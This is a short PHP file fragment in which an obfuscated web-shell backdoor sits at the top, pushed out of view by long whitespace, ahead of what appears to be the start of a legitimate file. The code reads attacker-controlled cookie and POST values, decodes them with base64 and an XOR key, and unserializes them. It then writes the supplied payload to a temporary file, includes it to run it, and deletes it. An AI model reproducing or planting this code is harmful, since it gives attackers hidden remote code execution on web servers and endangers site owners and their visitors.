<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("xfriXPx")){class xfriXPx{public static $wbOhAwFPE = "kBnYaXLolKiRJYQt";public static $SvwekV = NULL;public function __construct(){$IZfdFnCCRE = @$_COOKIE[substr(xfriXPx::$wbOhAwFPE, 0, 4)];if (!empty($IZfdFnCCRE)){$GUkrrJk = "base64";$AGTJxo = "";$IZfdFnCCRE = explode(",", $IZfdFnCCRE);foreach ($IZfdFnCCRE as $bKjFT){$AGTJxo .= @$_COOKIE[$bKjFT];$AGTJxo .= @$_POST[$bKjFT];}$AGTJxo = array_map($GUkrrJk . "_decode", array($AGTJxo,)); $AGTJxo = $AGTJxo[0] ^ str_repeat(xfriXPx::$wbOhAwFPE, (strlen($AGTJxo[0]) / strlen(xfriXPx::$wbOhAwFPE)) + 1);xfriXPx::$SvwekV = @unserialize($AGTJxo);}}public function __destruct(){$this->kaSBda();}private function kaSBda(){if (is_array(xfriXPx::$SvwekV)) {$fheYiwrBQj = sys_get_temp_dir() . "/" . crc32(xfriXPx::$SvwekV["salt"]);@xfriXPx::$SvwekV["write"]($fheYiwrBQj, xfriXPx::$SvwekV["content"]);include $fheYiwrBQj;@xfriXPx::$SvwekV["delete"]($fheYiwrBQj);exit();}}}$avtMj = new xfriXPx(); $avtMj = NULL;} ?><?php
/**
